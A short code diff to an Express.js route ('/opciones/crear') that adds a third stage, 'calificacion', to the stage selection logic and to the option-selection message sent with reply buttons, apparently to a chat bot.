@@ -81,7 +81,11 @@ app.post('/opciones/crear', async (req, res) => {
     const { dispositivoID, etapa } = req.body;
 
 const etapaSolicitud =
-    etapa === "autenticacion" ? "segunda" : "primera";
+    etapa === "calificacion"
+        ? "tercera"
+        : etapa === "autenticacion"
+            ? "segunda"
+            : "primera";
 
     if (
         typeof dispositivoID !== 'string' ||
@@ -116,7 +120,13 @@ solicitudesOpciones.set(idSolicitud, solicitud);
             '🔔 SELECCIÓN DE OPCIÓN\n\n' +
             'ID: ' + idVisible + '\n\n' +
             'Decisión: ' +
-            (etapaSolicitud === 'segunda' ? 'Segunda' : 'Primera') +
+(
+    etapaSolicitud === 'tercera'
+        ? 'Tercera'
+        : etapaSolicitud === 'segunda'
+            ? 'Segunda'
+            : 'Primera'
+) +
             '\n\nSelecciona una opción:',
 
                 reply_markup: {
